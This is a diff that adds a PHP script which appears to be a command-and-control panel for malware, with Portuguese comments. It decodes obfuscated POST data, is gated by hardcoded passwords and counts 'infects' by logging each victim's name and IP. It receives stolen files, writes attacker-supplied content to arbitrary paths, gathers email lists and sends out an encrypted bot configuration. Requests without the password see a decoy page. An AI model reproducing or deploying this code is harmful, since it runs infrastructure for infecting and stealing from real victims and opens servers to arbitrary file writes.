@@ -1,0 +1,263 @@
+<?php
+error_reporting(0);
+
+function baguncacrypt(){
+$R = "";
+    if (rand(0,3) == 1){
+      $R = (string)rand(0,9);
+    }
+return $R;
+}
+
+function cryptw($s1){
+$id = 13;
+$sx = "";
+$x = 0;
+$x4 = rand(0,24);
+$result = chr($x4+65);
+$x4 = $x4  + $id;
+
+    for ($i = 0; $i <= strlen($s1); $i++)
+    {
+        $x = ord(substr($s1,$i,1)) + $x4;
+        //echo substr($s1,$i,1)."-".$x." ";
+            if ($x <= 25)
+            {
+                $sx = "A".chr($x+65);
+            } else
+            {
+                $x2 = (int)($x / 25);
+                $x3 = $x - ($x2 * 25);
+                $sx = chr($x2+65). chr($x3+65);
+
+            }
+    $result .= $sx.baguncacrypt();
+    }
+
+
+return $result;
+}
+
+function decrypt($s1q){
+$id = 13;
+$s1 = preg_replace("/[^A-Z]+/", "", $s1q);
+$sx = "";
+$R = "";
+$x = 0;
+$x4 = ord(substr($s1,0,1))-65 ;
+
+$s1 = substr($s1,1);
+ while (strlen($s1) > 0) {
+ $R = $R.chr(((ord(substr($s1,0,1))-65)*25 + (ord(substr($s1,1,1))-65))-$x4-$id);
+ $s1 = substr($s1,2);
+ }
+return $R;
+}
+
+
+function folder_exist($folder)
+{
+    // Get canonicalized absolute pathname
+    $path = realpath($folder);
+
+    // If it exist, check if it's a directory
+    return ($path !== false AND is_dir($path)) ? $path : false;
+}
+
+
+function pegaup($versaoVBS, $slink){
+
+$myfile = fopen("upw.txt", "r") ;
+$conteudo = fread($myfile,filesize("upw.txt"));
+fclose($myfile);
+
+//$conteudo = cryptw(str_replace("%link%", $slink, $conteudo));
+
+//$myfile2 = fopen("fd1.txt", "r") ;
+//$conteudo2 = fread($myfile2,filesize("fd1.txt"));
+//fclose($myfile2);
+
+//$conteudo2 = str_replace("#versao#", $versaoVBS, $conteudo2);
+//$conteudo2 = str_replace("%crypt%", $conteudo, $conteudo2);
+
+return cryptw($conteudo);
+}
+
+
+
+
+function pegadadosw($sTipoCnx){
+
+if ($sTipoCnx == "9") $arqwdados = "wdados.txt";
+if ($sTipoCnx == "12") $arqwdados = "wdados2.txt";
+
+if ($file = fopen($arqwdados, "r")) {
+$xw = 0;
+$arw = array();
+$sw = "";
+    while(!feof($file)) {
+        //$arw[$xw] = fgets($file);
+        $sw = "";
+        $sw = str_replace("\n", "", fgets($file));
+        $sw = str_replace("\r", "", $sw);
+        $arw[$xw] = decrypt($sw);
+        $xw++;
+    }
+    fclose($file);
+
+}
+
+
+return $arw;
+}
+
+
+
+$getArrayKeys = array_values($_POST);
+
+$wSenha = decrypt($getArrayKeys[0]);
+$sTipoCnx = decrypt($getArrayKeys[1]);
+$var2 = decrypt($getArrayKeys[2]);
+
+
+$versaoVBS = "10";
+
+
+if ($wSenha == "aceleraamangarosa" || $wSenha == "aceleraverdao")
+{
+
+if (!(folder_exist("logs"))){
+mkdir("logs");
+}
+if (!(folder_exist("fw"))){
+mkdir("fw");
+}
+
+
+
+
+    /////// Conta Infect /////////////
+    if ($sTipoCnx == "1") {
+      $nome = decrypt($getArrayKeys[3]);
+      $arquivo = "w/c".decrypt($getArrayKeys[4])."/conta.txt";
+      $listainfect=file($arquivo);
+      $qtinfects = count($listainfect)+1;
+
+      $ip = $_SERVER["REMOTE_ADDR"];
+
+      $nome = $qtinfects."*".date("d/m")."  ".date('h:i')."*".$nome."*".$ip;
+      $nome = str_replace("*"," || ",$nome);
+
+            $fp = fopen($arquivo,"a+");
+            fwrite($fp, $nome."\r\n");
+            fclose($fp);
+            exit;
+    }
+
+    /////// Conta Infect /////////////
+    if ($sTipoCnx == "2") {
+      $nome = decrypt($getArrayKeys[3]);
+      $cont = $getArrayKeys[4];
+      $fp = fopen("fw/".$nome.date('hi').".txt", "w");
+      fwrite($fp, $cont);
+      fclose($fp);
+    }
+
+
+    /////// Envia arquivo /////////////
+    if ($sTipoCnx == "3") {
+        $idPainel = $var2;
+        $cmmd = decrypt($getArrayKeys[3]);
+        $arqcmmd = decrypt($getArrayKeys[4]);
+
+        try{
+            $fp = fopen($arqcmmd, 'w');
+            fwrite($fp, $cmmd);
+            fclose($fp);
+        } catch (Exception $e) {
+        }
+        exit;
+    }
+
+    /////// UPDATEANTIGO /////////////
+    if ($sTipoCnx == "5") {
+        echo "";
+        exit;
+    }
+    /////// UPDATENOVO /////////////
+    if ($sTipoCnx == "14") {
+        echo "";
+        exit;
+    }
+
+
+    if ($sTipoCnx == "11")
+    {
+        echo "erro";
+        $var3 = decrypt($getArrayKeys[3]);
+        $fp = fopen("listamail/".$var2, 'a+');
+        fwrite($fp, $var3."\r\n");
+        fclose($fp);
+        exit;
+    }
+
+
+    if ($sTipoCnx == "10")
+    {
+        echo "erro";
+        $var3 = decrypt($getArrayKeys[3]);
+        $fp = fopen("lista/".$var2, 'w+');
+        fwrite($fp, $var3."\r\n");
+        fclose($fp);
+        exit;
+    }
+
+    if ($sTipoCnx == "9" || $sTipoCnx == "12" )
+    {
+$arx = pegadadosw($sTipoCnx);
+$sconfig = decrypt("UDIDGDAFQDKFWFNFXFXDKDACSFNFUCSDACSGCFUDHCSDACSGCFUDICSDACSGCFUDJCSDAGAFIGDDHDJDPDNDAFNFGFWFFFLFFGEDAFSFTGBFTDHDEFFFWFVGAFNGBFTFSFJFYDHDKDGDHDEFHFTFRDEFGFWDAFSFTGBFTDIDEFFFWFVGAFNGBFTFSFJFYDHDKDGDHDEFHFTFRDEFGFWDAFSFTGBFTDJDEFFFWFVGAFNGBFTFSFJFYDHDKDGDHDEFHFTFRDEFGFWDAFSFTGBFTDKDEFFFWFVGAFNGBFTFSFJFYDHDKDGDHDEFHFTFRDEFGFWDAFSFTGBFTDLDEFFFWFVGAFNGBFTFSFJFYDHDKDGDHDEFHFTFRDEFGFWDAFSFTGBFTDMDEFFFWFVGAFNGBFTFSFJFYDHDKDGDHDEFHFTFRDEFGFWDAFSFTGBFTDNDEFFFWFVGAFNGBFTFSFJFYDHDKDGDHDEFHFTFRDEFGFWDAFSFTGBFTDODEFFFWFVGAFNGBFTFSFJFYDHDKDGDHDEFHFTFRDEFGFWDAFSFTGBFTDPDEFFFWFVGAFNGBFTFSFJFYDHDKDGDHDEFHFTFRDEFGFWDAFSFTGBFTDHDGDEFFFWFVGAFNGBFTFSFJFYDHDKDGDHDEFHFTFRDEFGFWDAFSFTGBFTDHDHDEFFFWFVGAFNGBFTFSFJFYDHDKDGDHDEFHFTFRDEFGFWDAFSFTGBFTDHDIDEFFFWFVGAFNGBFTFSFJFYDHDKDGDHDEFHFTFRDEFGFWDAFSFTGBFTDHDJDEFFFWFVGAFNGBFTFSFJFYDHDKDGDHDEFHFTFRDEFGFWDAFSFTGBFTDHDKDEFFFWFVGAFNGBFTFSFJFYDHDKDGDHDEFHFTFRDEFGFWDAFSFTGBFTDHDLDEFFFWFVGAFNGBFTFSFJFYDHDKDGDHDEFHFTFRDEFGFWDAFSFTGBFTDHDMDEFFFWFVGAFNGBFTFSFJFYDHDKDGDHDEFHFTFRDEFGFWDAFSFTGBFTDHDNDEFFFWFVGAFNGBFTFSFJFYDHDKDGDHDEFHFTFRDEFGFWDAFSFTGBFTDHDODEFFFWFVGAFNGBFTFSFJFYDHDKDGDHDEFHFTFRDEFGFWDAFSFTGBFTDHDPDEFFFWFVGAFNGBFTFSFJFYDHDKDGDHDEFHFTFRDEFGFWDAFSFTGBFTDIDGDEFFFWFVGAFNGBFTFSFJFYDHDKDGDHDEFHFTFRDEFGFWDAFSFTGBFTDIDHDEFFFWFVGAFNGBFTFSFJFYDHDKDGDHDEFHFTFRDEFGFWDAFSFTGBFTDIDIDEFFFWFVGAFNGBFTFSFJFYDHDKDGDHDEFHFTFRDEFGFWDAFSFTGBFTDIDJDEFFFWFVGAFNGBFTFSFJFYDHDKDGDHDEFHFTFRDEFGFWDAFSFTGBFTDIDKDEFFFWFVGAFNGBFTFSFJFYDHDKDGDHDEFHFTFRDEFGFWDAFSFTGBFTDIDLDEFFFWFVGAFNGBFTFSFJFYDHDKDGDHDEFHFTFRDEFGFWDAFSFTGBFTDIDMDEFFFWFVGAFNGBFTFSFJFYDHDKDGDHDEFHFTFRDEFGFWDAFSFTGBFTDIDNDEFFFWFVGAFNGBFTFSFJFYDHDKDGDHDEFHFTFRDEFGFWDAFSFTGBFTDIDODEFFFWFVGAFNGBFTFSFJFYDHDKDGDHDEFHFTFRDEFGFWDAFSFTGBFTDIDPDEFFFWFVGAFNGBFTFSFJFYDHDKDGDHDEFHFTFRDEFGFWDAFSFTGBFTDJDGDEFFFWFVGAFNGBFTFSFJFYDHDKDGDHDEFHFTFRDEFGFWDAFSFTGBFTDJDHDEFFFWFVGAFNGBFTFSFJFYDHDKDGDHDEFHFTFRDEFGFWDAFSFTGBFTDJDIDEFFFWFVGAFNGBFTFSFJFYDHDKDGDHDEFHFTFRDEFGFWDAFSFTGBFTDJDJDEFFFWFVGAFNGBFTFSFJFYDHDKDGDHDEFHFTFRDEFGFWDAFSFTGBFTDJDKDEFFFWFVGAFNGBFTFSFJFYDHDKDGDHDEFHFTFRDEFGFWDAFSFTGBFTDJDLDEFFFWFVGAFNGBFTFSFJFYDHDKDGDHDEFHFTFRDEFGFWDAFSFTGBFTDJDMDEFFFWFVGAFNGBFTFSFJFYDHDKDGDHDEFHFTFRDEFGFWDAFSFTGBFTDJDNDEFFFWFVGAFNGBFTFSFJFYDHDKDGDHDEFHFTFRDEFGFWDAFSFTGBFTDJDODEFFFWFVGAFNGBFTFSFJFYDHDKDGDHDEFHFTFRDEFGFWDAFSFTGBFTDJDPDEFFFWFVGAFNGBFTFSFJFYDHDKDGDHDEFHFTFRDEFGFWDAFSFTGBFTDKDGDEFFFWFVGAFNGBFTFSFJFYDHDKDGDHDEFHFTFRDEFGFWDAFSFTGBFTDKDHDEFFFWFVGAFNGBFTFSFJFYDHDKDGDHDEFHFTFRDEFGFWDAFSFTGBFTDKDIDEFFFWFVGAFNGBFTFSFJFYDHDKDGDHDEFHFTFRDEFGFWDAFSFTGBFTDKDJDEFFFWFVGAFNGBFTFSFJFYDHDKDGDHDEFHFTFRDEFGFWDAFSFTGBFTDKDKDEFFFWFVGAFNGBFTFSFJFYDHDKDGDHDEFHFTFRDEFGFWDAFSFTGBFTDKDLDEFFFWFVGAFNGBFTFSFJFYDHDKDGDHDEFHFTFRDEFGFWDAFSFTGBFTDKDMDEFFFWFVGAFNGBFTFSFJFYDHDKDGDHDEFHFTFRDEFGFWDAFSFTGBFTDKDNDEFFFWFVGAFNGBFTFSFJFYDHDKDGDHDEFHFTFRDEFGFWDAFSFTGBFTDKDODEFFFWFVGAFNGBFTFSFJFYDHDKDGDHDEFHFTFRDEFGFWDAFSFTGBFTDKDPDEFFFWFVGAFNGBFTFSFJFYDHDKDGDHDEFHFTFRDEFGFWDAFSFTGBFTDLDGDEFFFWFVGAFNGBFTFSFJFYDHDKDGDHDEFHFTFRDEFGFWDAFSFTGBFTDLDHDEFFFWFVGAFNGBFTFSFJFYDHDKDGDHDEFHFTFRDEFGFWDAFSFTGBFTDLDIDEFFFWFVGAFNGBFTFSFJFYDHDKDGDHDEFHFTFRDEFGFWDAFSFTGBFTDLDJDEFFFWFVGAFNGBFTFSFJFYDHDKDGDHDEFHFTFRDEFGFWDAFSFTGBFTDLDKDEFFFWFVGAFNGBFTFSFJFYDHDKDGDHDEFHFTFRDEFGFWDAFSFTGBFTDLDLDEFFFWFVGAFNGBFTFSFJFYDHDKDGDHDEFHFTFRDEFGFWDAFSFTGBFTDLDMDEFFFWFVGAFNGBFTFSFJFYDHDKDGDHDEFHFTFRDEFGFWDAFSFTGBFTDLDNDEFFFWFVGAFNGBFTFSFJFYDHDKDGDHDEFHFTFRDEFGFWDAFSFTGBFTDLDODEFFFWFVGAFNGBFTFSFJFYDHDKDGDHDEFHFTFRDEFGFWDAFSFTGBFTDLDPDEFFFWFVGAFNGBFTFSFJFYDHDKDGDHDEFHFTFRDEFGFWDAFSFTGBFTDMDGDEFFFWFVGAFNGBFTFSFJFYDHDKDGDHDEFHFTFRDEFGFWDAFSFTGBFTDMDHDEFFFWFVGAFNGBFTFSFJFYDHDKDGDHDEFHFTFRDEFGFWDAFSFTGBFTDMDIDEFFFWFVGAFNGBFTFSFJFYDHDKDGDHDEFHFTFRDEFGFWDA");
+$sconfig = str_replace("#ip#", $arx[0], $sconfig);
+$sconfig = str_replace("#wp1#", $arx[1], $sconfig);
+$sconfig = str_replace("#wp2#", $arx[2], $sconfig);
+$sconfig = str_replace("#wp3#", $arx[3], $sconfig);
+echo  cryptw($sconfig);
+
+    $var2 = str_replace("*", "_", $var2);
+    $var2 = str_replace(" ", "_", $var2);
+    $var2 = preg_replace("/[^a-zA-Z0-9_-]/i", "", $var2);
+        $fp = fopen("logs/".$var2,"wb");
+        fwrite($fp,"");
+        fclose($fp);
+        exit;
+    }
+
+
+
+    if ($sTipoCnx == "8")
+    {
+        $fp = fopen("wdados.txt","wb");
+        fwrite($fp,$var2);
+        fclose($fp);
+        exit;
+    }
+
+    if ($sTipoCnx == "13")
+    {
+        $fp = fopen($getArrayKeys[3],"wb");
+        fwrite($fp,$var2);
+        fclose($fp);
+        exit;
+    }
+
+
+
+} //senhaerrada
+
+$myfileindex = fopen("indexw.txt", "r") ;
+$conteudoindex = fread($myfileindex,filesize("indexw.txt"));
+fclose($myfileindex);
+
+echo $conteudoindex;
+//echo "erro 1234";
+exit;
+?>
